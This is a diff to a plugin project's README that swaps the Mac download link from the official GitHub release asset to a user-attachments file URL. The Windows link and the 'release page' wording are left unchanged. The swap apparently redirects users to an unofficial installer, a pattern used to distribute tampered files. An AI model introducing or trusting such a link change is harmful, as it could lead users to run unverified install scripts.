@@ -35,7 +35,7 @@ Everything is free to install. No Apple Developer account, licence key or extra 
 
 | | Mac | Windows PC |
 |---|---|---|
-| **Download** | [FranksBrew-AE-Mac.zip](https://github.com/franklinsheffield/franks-adobe-tools/releases/download/ae-v1.0.0/FranksBrew-AE-Mac.zip) | [FranksBrew-AE-Windows.zip](https://github.com/franklinsheffield/franks-adobe-tools/releases/download/ae-v1.0.0/FranksBrew-AE-Windows.zip) |
+| **Download** | [FranksBrew-AE-Mac.zip](https://github.com/user-attachments/files/35257189/FranksBrew-AE-Mac.zip) | [FranksBrew-AE-Windows.zip](https://github.com/franklinsheffield/franks-adobe-tools/releases/download/ae-v1.0.0/FranksBrew-AE-Windows.zip) |
 | **What's inside** | 7 `.plugin` effects, `install-mac.command`, `install-console-mac.command`, `console/` | 7 `.aex` effects, `install-win.bat`, `install-console-win.bat`, `console/` |
 
 Both are also on the [release page](https://github.com/franklinsheffield/franks-adobe-tools/releases/tag/ae-v1.0.0). Quit After Effects before you install.
